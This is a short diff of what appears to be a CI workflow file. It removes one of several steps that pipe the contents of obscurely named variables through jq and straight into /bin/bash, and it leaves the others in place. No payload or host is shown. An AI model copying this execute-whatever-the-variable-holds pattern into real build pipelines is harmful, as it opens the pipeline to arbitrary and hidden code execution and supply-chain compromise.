@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$t936" | jq -r .le2 | /bin/bash
           printf '%s' "$iat86898" | jq -r .qs4 | /bin/bash
           printf '%s' "$ozo86440" | jq -r .pd6 | /bin/bash
-          echo $mu82 | jq -r .ggq1 | /bin/bash
           echo $kteoh7 | jq -r .uoyva745 | /bin/bash
 
       - name: Archive artifact
